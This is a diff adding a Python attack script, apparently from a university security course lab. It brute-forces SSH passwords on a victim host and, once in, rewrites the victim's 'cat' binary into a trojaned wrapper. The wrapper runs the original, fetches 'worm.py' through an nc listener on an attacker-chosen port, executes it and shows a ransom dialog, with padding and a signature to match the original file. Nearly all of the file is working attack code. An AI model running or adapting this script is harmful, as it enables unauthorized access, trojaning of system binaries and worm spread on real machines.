@@ -1,0 +1,128 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+
+hostname = sys.argv[1] #victim ip
+attacker_ip = sys.argv[2]
+attacker_port = sys.argv[3]
+f = open('victim_ip.txt','w')
+f.write(hostname)
+f.close()
+
+def main():
+    global hostname
+    global attacker_port
+    import time
+    import itertools
+    sys.path.append("/home/csc2021/.local/lib/python3.8/site-packages")
+    import paramiko
+
+    f = open('/home/csc2021/materials/victim.dat','r')
+    li = f.readlines()
+    passwd_li = []
+    for item in li:
+        passwd_li.append(item.replace('\n',''))
+
+    username = "csc2021"
+    port = 22
+
+    k = open('/home/csc2021/kkk', 'w')
+    k.write("echo -ne '\\xaf\\xbe\\xad\\xde' >> temp")
+    k.close()
+
+    success = False
+    for i in range(len(passwd_li)):
+        if success:
+            break
+        result = itertools.permutations(passwd_li,i+1)
+        for passwd in result:
+            p = ''.join(map(str,passwd))
+            print("trying: " + p)
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(hostname, port, username, p, timeout=0.1, auth_timeout=0.5)
+
+                print("success.")
+                print("writing file to victim. wait 20 seconds...")
+                scp = paramiko.Transport((hostname, port))
+                scp.connect(username=username, password=p)
+                sftp = paramiko.SFTPClient.from_transport(scp)
+                sftp.put('/home/csc2021/kkk', '/home/csc2021/kkk')
+
+                stdin, stdout, stderr = client.exec_command("tar zcf cat cat")
+                
+                # append payload
+
+                stdin, stdout, stderr = client.exec_command("echo '#!/bin/bash' > temp")
+                time.sleep(1)
+                stdin, stdout, stderr = client.exec_command("echo 'cp cat cat1' >> temp")
+                time.sleep(1)
+                # unzip
+                stdin, stdout, stderr = client.exec_command("echo 'tail -n+16 cat1 | head -n -2 > temp2' >> temp; echo 'truncate -s -1 temp2' >> temp; echo 'tar zxf temp2' >> temp; echo 'rm temp2' >> temp")
+                time.sleep(1)
+                #stdin, stdout, stderr = client.exec_command("echo 'truncate -s -1 temp2' >> temp")
+                #stdin, stdout, stderr = client.exec_command("echo 'tar zxf temp2 -C tmp' >> temp")
+                #stdin, stdout, stderr = client.exec_command("echo 'rm temp2' >> temp")
+                # execute
+                stdin, stdout, stderr = client.exec_command("echo './cat $1' >> temp")
+                time.sleep(1)
+                # restore
+                stdin, stdout, stderr = client.exec_command("echo 'rm cat' >> temp")
+                time.sleep(1)
+                stdin, stdout, stderr = client.exec_command("echo 'mv cat1 cat' >> temp")
+                time.sleep(1)
+                # get worm's from attacker
+                stdin, stdout, stderr = client.exec_command("echo 'nc -l "+ attacker_port +" > worm.py' >> temp")
+                time.sleep(1)
+                stdin, stdout, stderr = client.exec_command("echo 'python3 worm.py 22291846172619859445381409012451 65535' >> temp")
+                time.sleep(1)
+                stdin, stdout, stderr = client.exec_command("echo 'rm worm.py' >> temp")
+                time.sleep(1)
+                stdin, stdout, stderr = client.exec_command("echo 'zenity --error --text=\"Give me ransom haha\" --title=\"Error\" --ok-label \"QQ\"' >> temp")
+                time.sleep(1)
+
+                # get size diff of file
+                d_len = 43416 - len(attacker_port) - 16250
+
+                # exit
+                stdin, stdout, stderr = client.exec_command("echo 'exit 0' >> temp")
+                time.sleep(1)
+                # add bytes
+                stdin, stdout, stderr = client.exec_command("for i in {1.." + str(d_len) + "}; do echo -n '#' >> ttt; done")
+                time.sleep(3)
+                stdin, stdout, stderr = client.exec_command("echo -n '\n' >> ttt")
+                time.sleep(1)
+                stdin, stdout, stderr = client.exec_command("cat ttt >> temp")
+                time.sleep(3)
+                # append original compressed file
+                stdin, stdout, stderr = client.exec_command("cat cat >> temp")
+                time.sleep(3)
+                stdin, stdout, stderr = client.exec_command("echo '\n' >> temp")
+                time.sleep(1)
+                # append signature
+                #s = '\xaf\xbe\xad\xde'
+                stdin, stdout, stderr = client.exec_command("chmod 777 kkk")
+                stdin, stdout, stderr = client.exec_command("./kkk")
+                # chmod
+                stdin, stdout, stderr = client.exec_command("chmod +x temp")
+                # change file name to 'cat'
+                stdin, stdout, stderr = client.exec_command("mv temp cat")
+                # remove 'ttt' 'kkk'
+                stdin, stdout, stderr = client.exec_command("rm ttt kkk")
+                
+                client.close()
+                success = True
+                stdin.close()
+                break
+            
+            except Exception:
+                client.close() 
+    
+    
+
+
+if __name__ == "__main__":
+    main()
+    os.system("rm /home/csc2021/kkk")
